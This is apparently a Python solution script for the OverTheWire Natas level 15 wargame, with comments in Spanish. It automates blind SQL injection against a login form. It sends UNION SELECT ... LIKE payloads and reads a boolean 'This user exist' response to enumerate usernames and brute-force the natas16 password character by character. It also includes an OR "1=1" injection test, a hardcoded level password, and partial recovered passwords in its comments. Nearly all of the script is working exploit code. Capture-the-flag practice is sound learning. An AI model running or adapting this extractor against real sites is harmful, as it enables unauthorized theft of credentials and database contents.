import requests

# Fill in your details here to be posted to the login form.


#Function to stablish connection
def iniciar_sesion(username,password,url):
    session = requests.Session()
    r = session.post(url,auth=(username, password))
    return session


#This function find the first initial character of the usernames stored in the database
def get_start_char(characters):
    start_char = []
    for char in characters:
        print(f"intentando con {char}")
        payload = {'username': "\" UNION SELECT * from users WHERE username LIKE \""+char+"%" }
        r= session.post(url,auth=(username, password),data=payload)
        if b"This user exist" in r.content:
            print(f"encontramos la siguiente inicial {char}")
            start_char.append(char)
    return start_char
              

def obtener_nombres(username,password,session,url):
    characters = 'qwertyuiopñlkjhgfdsazxcvbnm1234567890QWERTYUIOPÑLKJHGFDSAZXCVBNM*?!#$&/()='
    contador = 0
    #['ñ','a', 'c', 'b', 'n', 'Ñ', 'A', 'C', 'B', 'N']
    start_users = get_start_char(characters)
    print(f"estos son las iniciales de los usuarios")
    full_name = []
    for user_to_find in start_users:
        while True:
            if contador == len(characters)-1:
                full_name.append(user_to_find)
                contador=0
                break
            print(f"intentando con {user_to_find}{characters[contador]}")
            test = user_to_find+ characters[contador]
            payload = {'username': "\" UNION SELECT * from users WHERE username LIKE \""+test+"%" }
            r= session.post(url,auth=(username, password),data=payload)
            if b"This user exist" in r.content:
                print(f"encontramos con {characters[contador]}")
                user_to_find +=characters[contador]
                contador=0
            contador+=1
    print(f"los usuarios son {full_name}")
    return full_name

#password alice  hrotsfm734
#caminos de pass ['t', 'h', '6', 'T', 'H']

def obtener_password(username,password,session,url):
    characters = 'qwertyuiopñlkjhgfdsazxcvbnm1234567890QWERTYUIOPÑLKJHGFDSAZXCVBNM*?!#$&/()='
    contador = 0
    #hROtsfM734 HLwuGKts2w
    newpassword = 'hP'
    while True:
        if contador == len(characters)-1:
            break
        print(f"intentando con {newpassword}{characters[contador]}")
        test = newpassword+ characters[contador]
        #payload = {'username': "\" UNION SELECT * FROM users WHERE BINARY password LIKE \""+test+"%" }
        payload = {'username': "\" UNION SELECT * FROM users WHERE BINARY password LIKE \""+test+"%\" AND username = \"natas16" }
        r= session.post(url,auth=(username, password),data=payload)
        #print(r.content)
        if b"This user exist" in r.content:
            print(f"encontramos con {characters[contador]}")
            print(r.content)
            newpassword +=characters[contador]
            contador=0
            continue
        contador+=1
    print(f"la password es {newpassword}")

def obtener_password2(username,password,session,url):
    characters = 'qwertyuiopñlkjhgfdsazxcvbnm1234567890QWERTYUIOPÑLKJHGFDSAZXCVBNM*?!#$&/()='
    contador = 0
    newpassword = 'hP' #inicio h---[R P], 6 ,H
    l=[]
    while True:
        if contador == len(characters)-1:
            break
        print(f"intentando con {newpassword}{characters[contador]}")
        test = newpassword+ characters[contador]
        payload = {'username': "\" UNION SELECT * FROM users WHERE BINARY password LIKE \""+test+"%\" AND username = \"natas16" }
        r= session.post(url,auth=(username, password),data=payload)
        if b"This user exist" in r.content:
            print(f"encontramos con {characters[contador]}")
            l.append(characters[contador])
        contador+=1
    print(f"la password es {l}")

#Function to see if we can inject code
def test_code_injection():
    payload = {'debug':'True','username': "\" OR \"1=1" }
    r= session.post(url,auth=(username, password),data=payload)
    print(f"this is the content {r.content}")
    if b"This user exist" in r.content:
        print(f"look we injected code!")
    

if __name__ == "__main__" :
    username = "natas15"
    password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
    url = "http://natas15.natas.labs.overthewire.org/index.php?debug=true"
    #['ñatas16', 'alice', 'charlie', 'bob', 'natas16', 'Ñatas16', 'Alice', 'Charlie', 'Bob', 'Natas16']
    session= iniciar_sesion(username,password,url)
    test_code_injection()
    #names = obtener_nombres(username,password,session,url)
    #obtener_password(username,password,session,url)
